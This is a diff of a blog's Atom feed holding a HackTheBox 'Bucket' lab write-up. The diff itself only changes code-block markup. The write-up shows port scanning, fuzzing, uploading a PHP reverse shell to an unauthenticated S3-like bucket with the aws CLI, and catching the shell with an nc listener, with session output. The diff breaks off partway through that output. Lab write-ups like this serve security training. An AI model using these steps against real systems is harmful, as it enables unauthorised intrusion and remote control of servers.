@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Random stuff - HackTheBox</title><link href="/" rel="alternate"></link><link href="/feeds/hackthebox.atom.xml" rel="self"></link><id>/</id><updated>2021-06-27T20:00:00+02:00</updated><entry><title>HTB: Bucket</title><link href="/htb-bucket.html" rel="alternate"></link><published>2021-06-27T20:00:00+02:00</published><updated>2021-06-27T20:00:00+02:00</updated><author><name>Paweł Mateja</name></author><id>tag:None,2021-06-27:/htb-bucket.html</id><summary type="html">&lt;p&gt;Solution to the &lt;em&gt;Bucket&lt;/em&gt; VM&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Foothold&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Random stuff - HackTheBox</title><link href="/" rel="alternate"></link><link href="/feeds/hackthebox.atom.xml" rel="self"></link><id>/</id><updated>2021-06-27T20:00:00+02:00</updated><subtitle></subtitle><entry><title>HTB: Bucket</title><link href="/htb-bucket.html" rel="alternate"></link><published>2021-06-27T20:00:00+02:00</published><updated>2021-06-27T20:00:00+02:00</updated><author><name>Paweł Mateja</name></author><id>tag:None,2021-06-27:/htb-bucket.html</id><summary type="html">&lt;p&gt;Solution to the &lt;em&gt;Bucket&lt;/em&gt; VM&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Foothold&lt;/h1&gt;
 &lt;p&gt;First, as always we scan ports with &lt;em&gt;nmap&lt;/em&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nmap -sS -sV  &lt;span class="m"&gt;10&lt;/span&gt;.10.10.212  
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nmap -sS -sV  &lt;span class="m"&gt;10&lt;/span&gt;.10.10.212  
 Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.91 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2021&lt;/span&gt;-05-16 &lt;span class="m"&gt;23&lt;/span&gt;:27 CEST
 Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.212
 Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.038s latency&lt;span class="o"&gt;)&lt;/span&gt;.
@@ -12,16 +12,14 @@ PORT   STATE SERVICE VERSION
 Service Info: Host: &lt;span class="m"&gt;127&lt;/span&gt;.0.1.1&lt;span class="p"&gt;;&lt;/span&gt; OS: Linux&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in &lt;span class="m"&gt;8&lt;/span&gt;.03 seconds
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;There is something on port 80, so lets check:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl &lt;span class="m"&gt;10&lt;/span&gt;.10.10.212
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl &lt;span class="m"&gt;10&lt;/span&gt;.10.10.212
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Result: &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//IETF//DTD HTML 2.0//EN&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//IETF//DTD HTML 2.0//EN&amp;quot;&amp;gt;&lt;/span&gt;
 &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
 &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;302 Found&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
 &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
@@ -30,129 +28,110 @@ Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&g
 &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;hr&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
 &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;address&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;address&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
 &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;So we have to map this host name with the ip address:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10.10.10.212 bucket.htb&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee -a /etc/hosts
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10.10.10.212 bucket.htb&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee -a /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Now it start to work, but while looking through source code of recived page, we can see images urls, that are not opened correcly, like: http://s3.bucket.htb/adserver/images/bug.jpg&lt;/p&gt;
 &lt;p&gt;So we can add another line to our &lt;strong&gt;hosts&lt;/strong&gt; file&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10.10.10.212 s3.bucket.htb&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee -a /etc/hosts
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10.10.10.212 s3.bucket.htb&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee -a /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Great, the page is looking good right now. But the interesting part is the &lt;strong&gt;s3&lt;/strong&gt; suffix, as it sounds like a local instance of the famous Amazon Simple Storage Service. And the title of this machine confirms out assumption! So... let's have some fun with it.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://s3.bucket.htb/adserver/images/&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl &lt;span class="s2"&gt;&amp;quot;http://s3.bucket.htb/adserver/images/&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Result:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;Error&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;Code&amp;gt;&lt;/span&gt;NoSuchKey&lt;span class="nt"&gt;&amp;lt;/Code&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;Message&amp;gt;&lt;/span&gt;The specified key does not exist.&lt;span class="nt"&gt;&amp;lt;/Message&amp;gt;&lt;/span&gt;
 
     &lt;span class="nt"&gt;&amp;lt;RequestID&amp;gt;&lt;/span&gt;7a62c49f-347e-4fc4-9331-6e8eEXAMPLE&lt;span class="nt"&gt;&amp;lt;/RequestID&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;/Error&amp;gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://s3.bucket.htb/adserver/&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl &lt;span class="s2"&gt;&amp;quot;http://s3.bucket.htb/adserver/&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Result:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;running&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;running&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://s3.bucket.htb/&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl &lt;span class="s2"&gt;&amp;quot;http://s3.bucket.htb/&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Result:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;running&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;running&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;We can see different responses, so it looks promissing!&lt;/p&gt;
 &lt;p&gt;As it look like a s3 instance, we can try to use it like it, either by working with pure requests:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -X PUT http://s3.bucket.htb/adserver/ -T reverse-shell.php
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -X PUT http://s3.bucket.htb/adserver/ -T reverse-shell.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;That looks like a pure luck, but it is really working... But we can try something more. Why not use some FUZZ?&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc &lt;span class="m"&gt;404&lt;/span&gt; http://s3.bucket.htb/FUZZ/foo/
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc &lt;span class="m"&gt;404&lt;/span&gt; http://s3.bucket.htb/FUZZ/foo/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;And hey, what we have here?!&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                   
-=====================================================================
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;=====================================================================&lt;/span&gt;
+&lt;span class="n"&gt;ID&lt;/span&gt;           &lt;span class="n"&gt;Response&lt;/span&gt;   &lt;span class="n"&gt;Lines&lt;/span&gt;    &lt;span class="n"&gt;Word&lt;/span&gt;       &lt;span class="n"&gt;Chars&lt;/span&gt;       &lt;span class="n"&gt;Payload&lt;/span&gt;                                                                                   
+&lt;span class="o"&gt;=====================================================================&lt;/span&gt;
 
 
-000001688:   500        0 L      13 W       158 Ch      &amp;quot;shell&amp;quot;                                                                                   
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;span class="mi"&gt;000001688&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;500&lt;/span&gt;        &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;      &lt;span class="mi"&gt;13&lt;/span&gt; &lt;span class="n"&gt;W&lt;/span&gt;       &lt;span class="mi"&gt;158&lt;/span&gt; &lt;span class="n"&gt;Ch&lt;/span&gt;      &lt;span class="s2"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;                                                                                   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Lets take a look at this address:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="DynamoDB web client screenshot" src="images/htb-bucket/htb-bucket.png"&gt;&lt;/p&gt;
 &lt;p&gt;We are definitly going somewhere. For now just note that discovery.&lt;/p&gt;
 &lt;p&gt;For now we can try last, but most important thing: use the &lt;strong&gt;aws&lt;/strong&gt; cli. It is already on your system or just install it from system repo.&lt;/p&gt;
 &lt;p&gt;Now the param &lt;strong&gt;--endpoint-url&lt;/strong&gt; will be crucial. Lets try:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb s3 ls adserver/
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb s3 ls adserver/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Nope, one more step is missing:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws configure
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;aws configure
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;But we don't have any legit credentials. What can we do? Oh, well, just type anything in there. Any random stuff. And it works, jeeez!&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb s3 ls adserver/
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb s3 ls adserver/
                            PRE images/
 &lt;span class="m"&gt;2021&lt;/span&gt;-06-26 &lt;span class="m"&gt;23&lt;/span&gt;:58:04       &lt;span class="m"&gt;5344&lt;/span&gt; index.html
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;So prepare your pretty php reverse shell and copy it on the server, hoping it will work.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb s3 cp php-reverse-shell.php s3://adserver/
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb s3 cp php-reverse-shell.php s3://adserver/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Now we can try to execute it:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nc -lvnp &lt;span class="m"&gt;4321&lt;/span&gt; &lt;span class="c1"&gt;# in one term&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -lvnp &lt;span class="m"&gt;4321&lt;/span&gt; &lt;span class="c1"&gt;# in one term&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Next that below in another:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl http://bucket.htb/php-reverse-shell.php
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl http://bucket.htb/php-reverse-shell.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Then what we see on the &lt;strong&gt;nc&lt;/strong&gt; awaiting for connection?&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;listening&lt;/span&gt; &lt;span class="nt"&gt;on&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;4321&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;
-&lt;span class="nt"&gt;connect&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mf"&gt;10.10.14.11&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;from&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;UNKNOWN&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mf"&gt;10.10.10.212&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;54924&lt;/span&gt;
-&lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;bucket&lt;/span&gt; &lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0-48-generic&lt;/span&gt; &lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;52-Ubuntu&lt;/span&gt; &lt;span class="nt"&gt;SMP&lt;/span&gt; &lt;span class="nt"&gt;Thu&lt;/span&gt; &lt;span class="nt"&gt;Sep&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;58&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;49&lt;/span&gt; &lt;span class="nt"&gt;UTC&lt;/span&gt; &lt;span class="nt"&gt;2020&lt;/span&gt; &lt;span class="nt"&gt;x86_64&lt;/span&gt; &lt;span class="nt"&gt;x86_64&lt;/span&gt; &lt;span class="nt"&gt;x86_64&lt;/span&gt; &lt;span class="nt"&gt;GNU&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;Linux&lt;/span&gt;
- &lt;span class="nt"&gt;22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;03&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;15&lt;/span&gt; &lt;span class="nt"&gt;up&lt;/span&gt;  &lt;span class="nt"&gt;3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;08&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;  &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;user&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;  &lt;span class="nt"&gt;load&lt;/span&gt; &lt;span class="nt"&gt;average&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;01&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;20&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;25&lt;/span&gt;
-&lt;span class="nt"&gt;USER&lt;/span&gt;     &lt;span class="nt"&gt;TTY&lt;/span&gt;      &lt;span class="nt"&gt;FROM&lt;/span&gt;             &lt;span class="nt"&gt;LOGIN&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;   &lt;span class="nt"&gt;IDLE&lt;/span&gt;   &lt;span class="nt"&gt;JCPU&lt;/span&gt;   &lt;span class="nt"&gt;PCPU&lt;/span&gt; &lt;span class="nt"&gt;WHAT&lt;/span&gt;
-&lt;span class="nt"&gt;roy&lt;/span&gt;      &lt;span class="nt"&gt;pts&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt;    &lt;span class="nt"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;14&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;11&lt;/span&gt;      &lt;span class="nt"&gt;18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;59&lt;/span&gt;   &lt;span class="nt"&gt;56&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00s&lt;/span&gt;  &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;44s&lt;/span&gt;  &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;44s&lt;/span&gt; &lt;span class="nt"&gt;-bash&lt;/span&gt;
-&lt;span class="nt"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;www-data&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;www-data&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;www-data&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
-&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;sh&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;can&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;t&lt;/span&gt; &lt;span class="nt"&gt;access&lt;/span&gt; &lt;span class="nt"&gt;tty&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;job&lt;/span&gt; &lt;span class="nt"&gt;control&lt;/span&gt; &lt;span class="nt"&gt;turned&lt;/span&gt; &lt;span class="nt"&gt;off&lt;/span&gt;
-&lt;span class="o"&gt;$&lt;/span&gt; 
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;listening&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;any&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4321&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
